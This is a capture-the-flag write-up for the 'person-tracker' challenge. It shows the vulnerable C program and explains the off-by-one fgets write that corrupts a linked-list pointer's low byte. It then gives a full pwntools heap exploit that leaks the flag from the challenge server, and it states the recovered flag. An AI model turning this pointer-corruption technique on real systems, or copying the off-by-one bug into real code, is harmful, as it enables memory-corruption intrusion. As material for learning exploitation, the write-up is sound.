# person-tracker

```
Written by virchau13

I forget people's names all the time, so I made a tool to make it easier
nc challs.watctf.org 5151 
```

Attachment:

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#ifdef FLAGVAR
// In the server-side binary, `FLAGVAR` is set to the flag
const volatile char * const FLAG = FLAGVAR;
#else
const volatile char * const FLAG = "fakectf{not the real flag}";
#endif

typedef struct Person {
    uint64_t age;
    char name[24];
    struct Person *next;
} Person;

Person *root = NULL;

uint64_t person_count = 0;

Person *person_at_index(int idx) {
    Person *res = root;
    while (idx > 0) {
        res = res->next;
        idx--;
    }
    return res;
}

int main() {
    puts("Welcome to the Person Tracker!");
    while(1) {
        puts("MENU CHOICES:");
        puts("1. Add a new person");
        puts("2. View a person's information");
        puts("3. Update a person's information");
        printf("Enter your choice: ");
        fflush(stdout);
        int choice;
        if (scanf("%d", &choice) != 1) {
            printf("Invalid input. Please enter a number.\n");
            while (getchar() != '\n'); 
            continue;
        }
        getchar();
        if (choice == 1) {
            Person *new = malloc(sizeof(Person));
            new->next = root;
            root = new;
            person_count++;
            printf("Enter their age: ");
            fflush(stdout);
            scanf("%lu", &new->age);
            getchar();
            printf("Enter their name: ");
            fflush(stdout);
            fgets(new->name, sizeof(new->name) + 1, stdin); // +1 for null byte
            puts("New person prepended!");
        } else if (choice == 2) {
            printf("Specify the index of the person: ");
            fflush(stdout);
            int idx;
            scanf("%d", &idx);
            getchar();
            if (idx < 0 || idx >= person_count) {
                puts("Invalid index!");
                continue;
            }
            Person *p = person_at_index(idx);
            puts("What information do you want to view?");
            puts("1. Their age");
            puts("2. Their name");
            printf("Enter choice: ");
            fflush(stdout);
            int choice2;
            scanf("%d", &choice2);
            getchar();
            if (choice2 == 1) {
                printf("Their age is %lu\n", p->age);
            } else if (choice2 == 2) {
                printf("Their name is %s\n", p->name);
            }
        } else if (choice == 3) {
            printf("Specify the index of the person: ");
            fflush(stdout);
            int idx;
            scanf("%d", &idx);
            getchar();
            if (idx < 0 || idx >= person_count) {
                puts("Invalid index!");
                continue;
            }
            Person *p = person_at_index(idx);
            puts("What information do you want to modify?");
            puts("1. Their age");
            puts("2. Their name");
            printf("Enter choice: ");
            fflush(stdout);
            int choice2;
            scanf("%d", &choice2);
            getchar();
            if (choice2 == 1) {
                printf("Enter their age: ");
                fflush(stdout);
                scanf("%lu", &p->age);
                getchar();
            } else if (choice2 == 2) {
                printf("Enter the new name: ");
                fflush(stdout);
                fgets(p->name, sizeof(p->name) + 1, stdin); // +1 for null byte
            }
            puts("Updated successfully!");
        }
    }
}
```

There is a out of bounds write in:

```c
fgets(new->name, sizeof(new->name) + 1, stdin); // +1 for null byte
```

It will override the lowest byte of `next` to zero in:

```c
typedef struct Person {
    uint64_t age;
    char name[24];
    struct Person *next;
} Person;
```

If we consider the malloc chunk layout:

```
-0x08: chunk header
 0x00: age
 0x08: name
 0x10: &name[8]
 0x18: &name[16]
 0x20: next
```

We can put the address of flag `0x49b21e` obtained by [Binary Ninja](https://binary.ninja) to `&name[8]`. Then, if someday `next` overlaps with `&name[8]`, we can read the flag out.

This is probabilistic, so we put some dummy data on the heap. When we see the `next->age` overlaps with `age` or `&name[8]`, we know the condition is not satisfied. Otherwise, if `next->age` overlaps with `next`:

```
first chunk:
-0x08: chunk header
 0x00: age
 0x08: name
 0x10: &name[8]
 0x18: &name[16]
 0x20: next          <- next points to here
second chunk:
 0x28: chunk header
 0x30: age
 0x38: name
 0x40: &name[8]      <- next->next
 0x48: &name[16]
 0x50: next
```

We can read flag out via `next->next->age` and `next->next->name`:

```python
from pwn import *

# context(log_level = "debug")

# p = process("./person")
p = remote("challs.watctf.org", 5151)

flag_addr = 0x49B21E

# chunk layout
# -0x08: chunk header
#  0x00: age
#  0x08: name
#  0x10: &name[8]
#  0x18: &name[16]
#  0x20: next
# put flag_addr at &name[8], so that maybe some
# (struct Person *)(addr & ~0xFF)->next = flag_addr

while True:
    for i in range(5):
        p.recvuntil(b"choice: ")
        p.sendline(b"1")
        p.recvuntil(b"age: ")
        p.sendline(str(0xAAAAAAAAAAAAAAAA).encode())
        p.recvuntil(b"name: ")
        p.sendline(b"C" * 8 + p64(flag_addr))

    p.recvuntil(b"choice: ")
    p.sendline(b"1")
    p.recvuntil(b"age: ")
    p.sendline(str(0xAAAAAAAAAAAAAAAA).encode())
    p.recvuntil(b"name: ")
    p.sendline(b"C" * 8 + p64(flag_addr) + b"D" * 8)

    p.recvuntil(b"choice: ")
    p.sendline(b"2")
    p.recvuntil(b"person: ")
    p.sendline(b"1")
    p.recvuntil(b"choice: ")
    p.sendline(b"1")
    result = p.recvline()
    age = int(result.split()[-1])
    if age != flag_addr and age != 0xAAAAAAAAAAAAAAAA:  # filter
        p.recvuntil(b"choice: ")
        p.sendline(b"2")
        p.recvuntil(b"person: ")
        p.sendline(b"2")
        p.recvuntil(b"choice: ")
        p.sendline(b"1")
        result = p.recvline()
        age = int(result.split()[-1])
        print(age.to_bytes(8, "little"))

        p.recvuntil(b"choice: ")
        p.sendline(b"2")
        p.recvuntil(b"person: ")
        p.sendline(b"2")
        p.recvuntil(b"choice: ")
        p.sendline(b"2")
        name = p.recvline()
        print(name)
        break
```

Flag: `watctf{one_byte_1s_4ll_y0u_n33d}`.
